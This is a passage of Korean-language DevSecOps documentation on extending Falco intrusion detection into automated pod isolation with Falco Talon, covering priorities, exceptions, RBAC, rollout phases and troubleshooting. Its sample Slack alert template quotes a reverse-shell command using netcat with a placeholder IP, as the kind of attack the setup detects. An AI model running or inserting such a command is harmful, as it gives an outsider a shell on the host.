✅ 무시
```

**IPS 모드 (Pod Deletion 방식 - 위험)**:
```
⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
💥 자동으로 Pod 삭제
❌ 서비스 중단
❌ 운영자 작업 실패
❌ 복구 시간: 30초 ~ 1분
😡 운영자: "왜 내 Pod를 지웠어!?"
```

**IPS 모드 (Pod Isolation 방식 - 안전)**:
```
⚠️ Falco 탐지: "Launch Package Management Process" (WARNING)
🔔 Talon 설정: WARNING은 격리하지 않고 알림만
📩 Slack 알림: "패키지 관리자 실행됨, 확인 필요"
✅ 운영자 확인: "내가 한 작업이야"
✅ 작업 계속 진행
```

**핵심 차이**:
- **Pod Deletion**: False Positive 시 서비스 중단 위험
- **Pod Isolation**: False Positive 시 알림만, 서비스 유지
- **Priority 기반 분리**: CRITICAL만 격리, WARNING은 알림만

---

### 7. 안전장치 (False Positive 대응)

#### 7-1. Priority 기반 자동 대응

| Priority | 자동 대응 | 이유 |
|----------|----------|------|
| **CRITICAL** | ✅ 자동 격리 | Java RCE, Binary 조작 → 명백한 공격 |
| **ERROR** | 🔔 알림만 (격리 안 함) | Write to Binary Dir → False Positive 가능 |
| **WARNING** | 🔔 알림만 (격리 안 함) | Package Manager → 정상 작업 가능 |
| **NOTICE** | 📝 로그만 | Outbound Connection → 노이즈 많음 |

#### 7-2. 예외 룰 (Whitelist)

```yaml
# Talon values.yaml
config:
  rules:
    - name: isolate-rce-attack
      match:
        rules:
          - Java Process Spawning Shell
        priority: CRITICAL

      # 예외 조건
      exceptions:
        # 특정 namespace는 제외
        - namespace: kube-system
        - namespace: monitoring

        # CI/CD Pod는 제외
        - labels:
            ci-cd: "true"

        # 특정 시간대는 제외 (점검 시간)
        - time_range:
            start: "02:00"
            end: "04:00"
```

#### 7-3. Dry-Run 모드

**초기 운영 시 권장**: 실제 격리하지 않고 로그만 기록

```yaml
config:
  dry_run: true  # 실제 NetworkPolicy 생성 안 함, Slack 알림만
  rules:
    - name: isolate-rce-attack
      actions:
        - action: kubernetes:networkpolicy
          dry_run: true  # 이 액션만 dry-run
```

**효과**:
- Talon이 어떤 Pod를 격리할지 시뮬레이션
- False Positive 패턴 학습
- 실제 활성화 전 검증

---

### 8. RBAC 요구사항

Falco Talon이 Kubernetes API를 호출하려면 권한 필요:

```yaml
# Talon ServiceAccount에 부여할 권한
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: falco-talon-role
rules:
  # NetworkPolicy 관리
  - apiGroups: ["networking.k8s.io"]
    resources: ["networkpolicies"]
    verbs: ["create", "get", "list", "delete", "patch"]

  # Pod 라벨 수정 (격리 표시)
  - apiGroups: [""]
    resources: ["pods"]
    verbs: ["get", "list", "patch"]

  # Pod 정보 조회
  - apiGroups: [""]
    resources: ["pods", "namespaces"]
    verbs: ["get", "list"]

  # (선택) Pod 삭제 권한 - 초기엔 비활성화 권장
  # - apiGroups: [""]
  #   resources: ["pods"]
  #   verbs: ["delete"]
```

**최소 권한 원칙**:
- ✅ NetworkPolicy 관리 권한만 부여
- ✅ Pod 라벨 수정 권한 (quarantine 표시)
- ❌ Pod 삭제 권한은 나중에 추가 고려

---

### 9. 3단계 활성화 전략 (현재: Phase 1) 🆕

#### Phase 1: Dry-Run 모드 (1주) ✅ 진행 중

**기간**: 2026-01-23 ~ 2026-01-30 (1주)
**목표**: False Positive 패턴 학습
**상태**: ✅ 설치 완료, 운영 중

```bash
# Talon 설치 (Dry-Run) - 완료
helm install falco-talon falcosecurity/falco-talon \
  -n falco \
  -f /home/jimin/k8s-manifests/docs/helm/falco/talon-values.yaml

# 상태 확인
kubectl get pods -n falco -l app.kubernetes.io/name=falco-talon
```

**관찰 사항** (1주간 모니터링 예정):
- 어떤 Alert가 자주 발생하는가?
- False Positive는 몇 %인가?
- 예외 규칙이 필요한가?

#### Phase 2: WARNING 격리 (1주) ⏳ 1주 후 예정

**기간**: 2026-01-30 ~ 2026-02-06 (예정)
**목표**: 비교적 안전한 WARNING 레벨부터 격리 시작
**상태**: ⏳ 대기 중

```yaml
config:
  dry_run: false
  rules:
    - name: isolate-package-manager
      match:
        priority: WARNING
      actions:
        - action: kubernetes:networkpolicy
```

**검증**:
- 서비스 중단 없는가?
- False Positive 대응 시간은?
- 격리 해제 프로세스는 원활한가?

#### Phase 3: CRITICAL 격리 (지속 운영) ⏳ 2주 후 예정

**기간**: 2026-02-06 ~ (지속 운영 예정)
**목표**: 실제 공격 자동 차단
**상태**: ⏳ 대기 중

```yaml
config:
  dry_run: false
  rules:
    - name: isolate-rce-attack
      match:
        priority: CRITICAL
      actions:
        - action: kubernetes:networkpolicy
```

**모니터링**:
- CRITICAL Alert 발생 빈도
- 자동 격리 성공률
- 평균 대응 시간 (목표: 5초 이내)

---

### 10. 격리 해제 방법

#### 수동 해제 (False Positive 확인 후)

```bash
# 1. 격리 상태 확인
kubectl get networkpolicy -n blog-system | grep quarantine

# 2. NetworkPolicy 삭제
kubectl delete networkpolicy quarantine-was-xxxxx -n blog-system

# 3. Pod 라벨 제거
kubectl label pod was-xxxxx quarantine- falco-response- -n blog-system

# 4. 트래픽 복구 확인
kubectl exec -it was-xxxxx -n blog-system -- curl -I https://google.com
```

#### 자동 해제 (향후 개선)

**Talon에 "격리 해제" 액션 추가 가능**:

```yaml
# 예: 30분 후 자동 해제
- action: kubernetes:networkpolicy
  parameters:
    ttl: 1800  # 30분 후 자동 삭제
```

---

### 11. 모니터링 및 검증

#### Grafana 대시보드 쿼리

**격리된 Pod 수 조회**:
```promql
# Prometheus metric (Talon이 노출)
falco_talon_actions_total{action="kubernetes:networkpolicy",status="success"}
```

**격리 해제 시간 추적**:
```bash
# NetworkPolicy 생성 시간 확인
kubectl get networkpolicy quarantine-was-xxxxx -n blog-system \
  -o jsonpath='{.metadata.creationTimestamp}'
```

#### Slack 알림 템플릿

```
🚨 **자동 격리 실행**

**Alert**: Java Process Spawning Shell
**Priority**: CRITICAL
**Pod**: was-7d4b9c8f-xj2k9
**Namespace**: blog-system
**Command**: /bin/sh -c "nc -e /bin/sh 1.2.3.4 4444"

**조치 완료**:
✅ NetworkPolicy 적용 (모든 Egress 차단)
✅ Pod 라벨: quarantine=true

**다음 단계**:
1. 포렌식 조사:
   `kubectl logs was-7d4b9c8f-xj2k9 -n blog-system`
   `kubectl exec -it was-7d4b9c8f-xj2k9 -n blog-system -- /bin/sh`

2. False Positive 확인:
   - 정상 작업인가?
   - 예외 규칙 추가 필요한가?

3. 격리 해제 (정상 작업인 경우):
   `kubectl delete networkpolicy quarantine-was-7d4b9c8f-xj2k9 -n blog-system`
   `kubectl label pod was-7d4b9c8f-xj2k9 quarantine- -n blog-system`
```

---

### 12. IPS 활성화 체크리스트

#### ✅ 사전 준비 (현재 완료)
- [x] Falco IDS 운영 (1주 이상)
- [x] 커스텀 룰 작성 및 테스트
- [x] Loki 연동 및 Grafana 대시보드
- [x] BuildKit False Positive 이해

#### ⏳ IPS 구축 (다음 단계)
- [ ] Falco Talon Helm 설치
- [ ] Talon values.yaml 작성
- [ ] RBAC 권한 설정
- [ ] Dry-Run 모드 1주 운영
- [ ] False Positive 패턴 분석
- [ ] 예외 규칙 추가
- [ ] WARNING 격리 활성화
- [ ] CRITICAL 격리 활성화

#### 🔜 선택 사항
- [ ] Slack Webhook 연동
- [ ] 자동 격리 해제 (TTL)
- [ ] Prometheus 메트릭 수집
- [ ] 격리 Pod 자동 분석 (람다)

---

## IPS vs IDS 최종 비교

| 항목 | IDS (현재) | IPS (Talon + Isolation) |
|------|-----------|------------------------|
| **탐지** | ✅ syscall 모니터링 | ✅ syscall 모니터링 |
| **알림** | ✅ Loki + Grafana | ✅ Loki + Slack |
| **대응** | ❌ 수동 (운영자 확인 필요) | ✅ 자동 격리 (5초) |
| **증거 보존** | ✅ Loki 로그 | ✅ Loki + Pod 유지 |
| **서비스 영향** | ✅ 없음 | ⚠️ 격리된 Pod만 네트워크 차단 |
| **False Positive 대응** | ✅ 무시 가능 | ✅ 격리 해제 가능 (수동) |
| **공격 차단** | ❌ 불가능 | ✅ C&C 통신 차단, 데이터 유출 방지 |
| **평균 대응 시간** | ⏱️ 5분 ~ 1시간 | ⏱️ 5초 |

---

**권장 일정**:
- **1주차**: Falco Talon 설치 + Dry-Run
- **2주차**: WARNING 격리 활성화
- **3주차**: CRITICAL 격리 활성화
- **4주차**: 모니터링 및 튜닝

---

## 트러블슈팅

### 1. inotify 초기화 실패

**증상**:
```
Error: could not initialize inotify handler
```

**원인**: inotify watch limit 부족

**해결**:
```bash
# 노드에 SSH 접속 후
sudo sysctl -w fs.inotify.max_user_watches=524288
sudo sysctl -w fs.inotify.max_user_instances=512

# 영구 적용
echo "fs.inotify.max_user_watches=524288" | sudo tee -a /etc/sysctl.conf
echo "fs.inotify.max_user_instances=512" | sudo tee -a /etc/sysctl.conf

# Pod 재시작
kubectl delete pod -n falco -l app.kubernetes.io/name=falco --field-selector spec.nodeName=<노드명>
```

### 2. Falcosidekick 연결 실패

**증상**: Alert가 Loki에 전송되지 않음

**확인**:
```bash
kubectl logs -n falco deploy/falco-falcosidekick
```

**해결**: Loki 서비스 주소 확인
```bash
kubectl get svc -n monitoring | grep loki
# loki-stack.monitoring.svc.cluster.local:3100
```

### 3. modern_ebpf 드라이버 실패

**증상**:
```
Error: failed to load modern BPF probe
```

**원인**: 커널 버전 부족 (5.8 미만)

**확인**:
```bash
uname -r
# 5.8 이상이어야 함
```

**해결**: ebpf (classic) 드라이버로 변경
```yaml
driver:
  kind: ebpf  # modern_ebpf → ebpf
```

### 4. BuildKit Alert (False Positive)

**증상**:
```
🚨 CRITICAL: Drop and execute new binary in container
container_image=moby/buildkit
rule="Drop and execute new binary in container"
```

**원인**: GitHub Actions에서 Docker 이미지 빌드 시 BuildKit이 컨테이너 내부에서 바이너리를 생성하고 실행

**판단**: ✅ **정상 동작 (False Positive)**
- BuildKit은 Docker 빌드 프로세스의 일부
- `/check` 바이너리는 BuildKit 헬스체크용
- 실제 공격이 아님

**해결 방법** (선택 사항):
1. **무시**: 이 Alert는 정상으로 간주하고 무시
2. **룰 예외 추가**:
```yaml
customRules:
  blog-rules.yaml: |-
    - rule: Drop and execute new binary in container
      append: true
      exceptions:
        - name: buildkit_binaries
          fields:
            - container_image
          values:
            - moby/buildkit
```

**권장**: BuildKit Alert는 정상 동작이므로 무시하거나, 예외 추가

### 5. TTY 조건 이해 (Shell 탐지 안 됨)

**증상**: `kubectl exec ... -- /bin/sh -c "echo test"` 명령이 탐지 안 됨

**원인**: "Terminal shell in container" 룰의 조건에 `proc.tty != 0` 포함
- TTY가 할당되어야만 탐지됨
- `-it` 플래그 없이 실행하면 TTY가 할당되지 않음

**해결**: `-it` 플래그 사용
```bash
# ❌ 탐지 안 됨
kubectl exec pod-name -- /bin/sh -c "echo test"

# ✅ 탐지됨
kubectl exec -it pod-name -- /bin/sh
```

**이유**: 대부분의 실제 공격은 TTY를 할당하여 Interactive Shell을 사용하기 때문

---

## 관련 문서

| 문서 | 설명 |
|------|------|
| [Falco 공식 문서](https://falco.org/docs/) | 공식 가이드 |
| [Falcosidekick](https://github.com/falcosecurity/falcosidekick) | Alert 전송 |
| [Helm Values](../../k8s-manifests/docs/helm/falco/values.yaml) | 설치 설정 |
| [DEVSECOPS-ARCHITECTURE.md](../../k8s-manifests/docs/DEVSECOPS-ARCHITECTURE.md) | 전체 보안 아키텍처 |

---

**작성일**: 2026-01-22
**버전**: Falco 0.42.1
**상태**: ✅ IDS 운영 중
